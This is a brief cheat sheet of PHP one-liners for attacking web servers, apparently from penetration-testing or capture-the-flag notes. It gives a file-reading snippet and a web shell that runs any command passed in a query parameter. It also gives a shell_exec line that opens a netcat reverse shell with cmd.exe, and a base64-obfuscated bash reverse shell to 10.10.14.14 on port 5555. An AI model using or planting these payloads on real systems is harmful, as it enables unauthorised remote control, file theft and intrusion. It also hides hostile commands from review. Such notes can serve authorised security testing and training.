## PHP One-liners

Read arbitrary files from the server's filesystem:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

Pass an arbitrary system command via a query parameter: _(exploit.php?command=whoami)_

`<?php echo system($_GET['command']); ?>`

Execute commands on the host:

`<?php $out=shell_exec('nc64.exe IP PORT -e cmd.exe'); echo '<pre>'.$out.'</pre>'; ?>`

If theres ever a time we have a web-shell, and we want to leverage it to get a full reverse shell:

```
First, base64 encode:
/bin/bash -i >& /dev/tcp/10.10.14.14/5555 0>&1

Final payload: (Dont forget to URL encode)
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo= | base64 -d | bash
```

